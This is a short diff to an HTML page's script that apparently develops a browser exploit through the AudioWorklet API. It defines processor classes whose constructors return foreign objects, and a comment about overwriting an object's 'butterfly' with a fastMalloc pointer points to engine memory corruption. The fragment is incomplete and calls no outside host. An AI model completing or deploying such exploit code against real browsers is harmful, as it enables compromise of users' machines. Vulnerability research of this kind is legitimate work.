@@ -1,9 +1,22 @@
 <script>
 alert("Starting");
-let audioContext = new AudioContext();
 var offctx = new OfflineAudioContext(1,128,300000);
 offctx.audioWorklet.addModule(URL.createObjectURL(new Blob([`
-registerProcessor("a", class {
+class a extends AudioWorkletProcessor {
+    constructor(){
+        super();
+        //var fuck2 = new AudioWorkletProcessor();
+        return b;
+    }
+    static get parameterDescriptors() {
+        return []
+    }
+    process (inputs, outputs, parameters) {
+        
+        return false;
+    }
+}
+/*registerProcessor("a", class {
         constructor() {
           // setup a message port to the main thread
           port = new AudioWorkletProcessor().port;
@@ -20,7 +33,7 @@ registerProcessor("b", class {
           // overwrite b1's butterfly with a fastMalloc pointer
           return {fill: 1, b: b0};
         }
-      });
+      });*/
 
 `],{type:'text/javascript'}))).then(async () => {
 var node1 = new AudioWorkletNode(offctx, "a");
